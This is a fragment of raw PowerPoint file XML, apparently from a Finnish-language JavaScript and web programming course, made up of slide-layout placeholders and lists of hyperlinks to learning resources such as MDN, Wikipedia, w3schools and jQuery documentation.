                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6F32700C-DFD7-4285-A22D-7A76A4007ADA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{4A244179-71B9-40EC-9EF8-84D7797B9259}" type="datetimeFigureOut">
              <a:rPr lang="fi-FI"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>20.9.2021</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Alatunnisteen paikkamerkki 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8CEBB229-DF25-40EE-8B79-D84913BF214C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Dian numeron paikkamerkki 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CBB5E0AA-85F3-400E-B49D-642751C82CED}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{A7BB57F9-D632-40DF-9365-C542E8ED8101}" type="slidenum">
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3705290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Pystysuoran tekstin paikkamerkki 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" orient="vert" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr vert="eaVe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A66F36A0-D9FA-4669-B2EF-D1161B97DA06}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{9138B725-0094-4E77-A500-5E16341D4915}" type="datetimeFigureOut">
              <a:rPr lang="fi-FI"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>20.9.2021</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Alatunnisteen paikkamerkki 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9C3E0A32-0C8A-4DA7-8A5B-E75B0A61EDDF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Dian numeron paikkamerkki 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D3A96E47-63FA-4DF5-8BF0-A6DBE7A94024}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{DE01C874-77E2-4C41-B864-124112BEE018}" type="slidenum">
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2301638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8839200" y="274639"/>
            <a:ext cx="2743200" cy="5851525"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="eaVert"/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI"/>
              <a:t>Muokkaa perustyyl. napsautt.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Pystysuoran tekstin paikkamerkki 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" orient="vert" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="274639"/>
            <a:ext cx="8026400" cy="5851525"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="eaVe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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{96BE90AA-6890-482B-ADEA-5C7AADB39DA1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{22592BAD-8EEE-469B-A3E0-E35DFDE0E2F0}" type="datetimeFigureOut">
              <a:rPr lang="fi-FI"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>20.9.2021</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Alatunnisteen paikkamerkki 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DAA08DC8-88E8-49D5-B817-296CE9C7F58C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Dian numeron paikkamerkki 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F3AEA94B-7955-4758-8DEE-B3A3861D9C10}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{A353B9EB-3A86-4216-B3AA-61BC01D60220}" type="slidenum">
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2788396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Otsikon paikkamerkki 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{36973953-B270-4D06-8942-8FF06986E400}"/>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i-FI" altLang="fi-FI"/>
              <a:t>Muokkaa perustyyl. napsautt.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1027" name="Tekstin paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E548E2CD-4C26-4494-9D28-8FAAC8EC48FE}"/>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i-FI" altLang="fi-FI"/>
              <a:t>Muokkaa tekstin perustyylejä napsauttamalla</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI"/>
              <a:t>toinen taso</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI"/>
              <a:t>kolmas taso</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3"/>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI"/>
              <a:t>neljäs taso</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="4"/>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI"/>
              <a:t>viides taso</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Päivämäärän paikkamerkki 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{38ECEAD5-3A5C-4E56-A707-5650D47C2289}"/>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5757DAB8-8D1F-4301-9543-36E60CFBE3FF}" type="datetimeFigureOut">
              <a:rPr lang="fi-FI"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>20.9.2021</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Alatunnisteen paikkamerkki 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{256A7FC9-65F7-4E07-9D1D-C753ED8BE244}"/>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Dian numeron paikkamerkki 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F2A2DC6E-FE92-4A6B-BD3F-83BDC25DE38D}"/>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1ED5C02A-C15B-4D07-B8EB-FF1C8E9EEA04}" type="slidenum">
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" alt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en.wikipedia.org/wiki/Prototype-based_programming" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://en.wikipedia.org/wiki/JavaScript" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout2.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.ecma-international.org/publications/files/ECMA-ST/ECMA-262.pdf" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://en.wikipedia.org/wiki/ECMAScript" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://en.wikipedia.org/wiki/JScri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nodejs.org/e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wiki/EdgeHTML" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://en.wikipedia.org/wiki/V8_(JavaScript_engine)" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/Trident_(software)" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://en.wikipedia.org/wiki/Comparison_of_layout_engines_(ECMAScript)" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout2.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/WebKit" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://en.wikipedia.org/wiki/SpiderMonkey_(JavaScript_engine)" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://en.wikipedia.org/wiki/JScript" TargetMode="External"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://en.wikipedia.org/wiki/Rhino_(JavaScript_engine)"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2ality.com/2013/04/12quirks.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n.wikipedia.org/wiki/Minification_(programming)" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.javascriptobfuscator.com/Default.asp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pmjs.com/" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cordova.apache.org/" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://octoverse.github.com/projects" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout2.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.simplytechnologies.net/blog/2018/4/4/lets-get-clear-about-react-native" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.postscapes.com/javascript-and-the-internet-of-things/" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.modulecounts.co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xperiments.withgoogle.com/collection/chrome" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://webglsamples.org/" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout2.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.chromeexperiments.com/" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.youtube.com/watch?v=BV32Cs_CMqo"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developer.mozilla.org/bm/docs/Web/JavaScript" TargetMode="External"/><Relationship Id="rId13" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://es6-features.org/#Constants" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://eloquentjavascript.net/Eloquent_JavaScript.pdf" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://exploringjs.com/impatient-js/downloads/impatient-js-preview-book.pdf" TargetMode="External"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.w3schools.com/js/" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://eloquentjavascript.net/" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout2.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://exploringjs.com/impatient-js/toc.html" TargetMode="External"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.codecademy.com/en/tracks/javascript" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://exploringjs.com/impatient-js/" TargetMode="External"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.codecademy.com/learn/learn-javascript" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/getify/You-Dont-Know-JS" TargetMode="External"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://javascript.info/" TargetMode="External"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API/Tutoria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javascript.info/symbol" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://en.wikipedia.org/wiki/Unicod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javascriptkit.com/jsref/assignment_operators.s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developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Stri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www.javascriptkit.com/jsref/arrays.s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gnu.org/software/gettext/"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developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Functions"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2ality.com/2015/10/why-tdz.html" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.valentinog.com/blog/var/"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medium.com/javascript-in-plain-english/javascript-from-closure-to-modules-21d1ba30ab36"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addyosmani.com/resources/essentialjsdesignpatterns/book/"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s://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules"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www.sitepoint.com/using-es-modules/"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docs.python.org/3/tutorial/datastructures.html#dictionaries" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Working_with_Objects"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hyperlink" Target="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/radio" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/checkbox" TargetMode="Externa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hyperlink" Target="http://www.javascriptkit.com/jsref/select.shtml" TargetMode="Externa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hyperlink" Target="http://www.javascriptkit.com/jsref/date.shtml" TargetMode="Externa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hyperlink" Target="http://www.javascriptkit.com/jsref/number.shtml" TargetMode="Externa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hyperlink" Target="http://www.elated.com/articles/creating-a-javascript-clock/" TargetMode="Externa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hyperlink" Target="http://msdn.microsoft.com/en-us/library/ms536651(v=vs.85).aspx" TargetMode="Externa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hyperlink" Target="http://www.quirksmode.org/js/popup.html" TargetMode="Externa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hyperlink" Target="http://www.javascriptkit.com/jsref/window.shtml" TargetMode="Externa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8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://threejs.org/" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://en.wikipedia.org/wiki/B&#233;zier_curve" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://webglfundamentals.org/webgl/lessons/webgl-shaders-and-glsl.html" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://en.wikipedia.org/wiki/Canvas_(HTML_element)" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout2.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://en.wikipedia.org/wiki/Adobe_Flash" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://en.wikipedia.org/wiki/Scalable_Vector_Graphics" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://en.wikipedia.org/wiki/WebGL" TargetMode="External"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide164.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://simon.html5.org/dump/html5-canvas-cheat-sheet.html" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API/Tutorial" TargetMode="Externa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hyperlink" Target="https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API/Tutorial/Drawing_shapes" TargetMode="Externa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hyperlink" Target="https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API/Tutorial/Drawing_shapes#Drawing_paths" TargetMode="Externa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hyperlink" Target="https://developer.mozilla.org/en/Drawing_text_using_a_canvas" TargetMode="Externa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hyperlink" Target="https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API/Tutorial/Applying_styles_and_colors" TargetMode="Externa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hyperlink" Target="https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API/Tutorial/Applying_styles_and_colors" TargetMode="Externa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hyperlink" Target="https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API/Tutorial/Transformations" TargetMode="Externa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hyperlink" Target="https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API/Tutorial/Compositing" TargetMode="Externa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hyperlink" Target="https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API/Tutorial/Using_images" TargetMode="Externa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hyperlink" Target="http://www.quirksmode.org/js/keys.html" TargetMode="Externa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hyperlink" Target="http://www.w3schools.com/tags/tag_audio.asp" TargetMode="Externa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hyperlink" Target="http://www.techrepublic.com/blog/web-designer/how-to-use-the-new-html5-audio-element/" TargetMode="Externa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hyperlink" Target="http://www.w3schools.com/tags/tag_video.asp" TargetMode="Externa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hyperlink" Target="http://www.w3schools.com/html/html5_video.asp" TargetMode="Externa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hyperlink" Target="http://www.w3schools.com/tags/ref_av_dom.asp" TargetMode="Externa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hyperlink" Target="http://dev.w3.org/geo/api/spec-source.html" TargetMode="Externa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hyperlink" Target="https://developer.mozilla.org/en-US/docs/Web/API/Geolocation/Using_geolocation" TargetMode="Externa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hyperlink" Target="http://www.w3schools.com/html/html5_geolocation.asp" TargetMode="Externa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hyperlink" Target="http://dev-test.nemikor.com/web-storage/support-test/" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.w3schools.com/html/html5_webstorage.asp" TargetMode="Externa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hyperlink" Target="https://dexie.org/" TargetMode="Externa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hyperlink" Target="https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API/Using_IndexedDB" TargetMode="Externa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hyperlink" Target="http://www.w3schools.com/html/html5_webworkers.asp" TargetMode="Externa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8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/Ajax_(programming)" TargetMode="External"/><Relationship Id="rId13" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://plugins.jquery.com/" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/JavaScript_library" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/CSS_animation" TargetMode="External"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://modernizr.com/" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://jquery.com/" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout2.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/Event_handling" TargetMode="External"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://getbootstrap.com/" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/Document_Object_Model" TargetMode="External"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://w3techs.com/technologies/overview/javascript_library/all" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/HTML" TargetMode="External"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://johnresig.com/" TargetMode="Externa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hyperlink" Target="https://api.jquery.com/category/selectors/" TargetMode="Externa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hyperlink" Target="https://api.jquery.com/category/traversing/" TargetMode="Externa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hyperlink" Target="https://api.jquery.com/category/manipulation/" TargetMode="Externa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hyperlink" Target="https://api.jquery.com/category/events/" TargetMode="Externa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hyperlink" Target="https://api.jquery.com/category/effects/" TargetMode="Externa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hyperlink" 